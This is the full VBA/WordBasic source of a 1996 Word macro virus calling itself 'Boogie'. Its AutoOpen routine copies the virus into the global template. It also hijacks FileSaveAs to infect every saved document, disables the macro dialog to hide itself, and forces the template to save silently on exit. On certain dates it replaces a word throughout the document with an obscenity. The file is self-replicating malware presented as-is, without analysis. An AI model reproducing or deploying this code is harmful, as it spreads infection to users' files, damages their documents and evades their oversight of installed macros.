   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim vCount
   Dim I_
   Dim vFName$
   Dim vMacro$

       Rem ***********************************************
       Rem * Boogie v4.0beta (c) DNazi [SGWW] Kiev 1996. *
       Rem * Dedicated to Mike Naumenko.                 *
       Rem ***********************************************

       On Error GoTo -1: On Error GoTo Fuck
       vCount = WordBasic.CountMacros(0, 0)
       For I_ = 1 To vCount
           If WordBasic.[MacroName$](I_, 0, 0) = "Boogie" Then GoTo Fuck
       Next I_

               vFName$ = WordBasic.[FileName$]()
               vMacro$ = vFName$ + ":AutoOpen"
               WordBasic.MacroCopy vMacro$, "Global:Boogie"
               vMacro$ = vFName$ + ":vFSav"
               WordBasic.MacroCopy vMacro$, "Global:FileSaveAs"
               vMacro$ = vFName$ + ":vMacro"
               WordBasic.MacroCopy vMacro$, "Global:ToolsMacro"
               vMacro$ = vFName$ + ":vExit"
               WordBasic.MacroCopy vMacro$, "Global:FileExit"
   Fuck:
   End Sub

   Attribute VB_Name = "vMacro"

   Public Sub MAIN()
       Rem Gotcha ! :-P
   End Sub

   Attribute VB_Name = "vFSav"

   Public Sub MAIN()
   Dim vFName$
   Dim vOMacro$
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)

       On Error GoTo -1: On Error GoTo OrigFSaveAs

       WordBasic.CurValues.FileSaveAs dlg
       WordBasic.Dialog.FileSaveAs dlg
       If dlg.Format = 0 Then dlg.Format = 1

       vFName$ = WordBasic.[FileName$]()
       vOMacro$ = vFName$ + ":AutoOpen"
       WordBasic.MacroCopy "Global:Boogie", vOMacro$
       vOMacro$ = vFName$ + ":vFSav"
       WordBasic.MacroCopy "Global:FileSaveAs", vOMacro$
       vOMacro$ = vFName$ + ":vMacro"
       WordBasic.MacroCopy "Global:ToolsMacro", vOMacro$
       vOMacro$ = vFName$ + ":vExit"
       WordBasic.MacroCopy "Global:FileExit", vOMacro$

       If WordBasic.Day(WordBasic.Now()) = WordBasic.Month(WordBasic.Now()) Then

       WordBasic.EditReplace Find:="ìèð", Replace:="õóé", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1
       WordBasic.MsgBox "Boogie ev'ry day!"

       End If

       WordBasic.FileSaveAs dlg
       GoTo AllOver

   OrigFSaveAs:
       If Err.Number <> 102 Then
           WordBasic.FileSaveAs dlg
       End If

   AllOver:
   End Sub

   Attribute VB_Name = "vExit"

   Public Sub MAIN()
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.FileExit
   End Sub
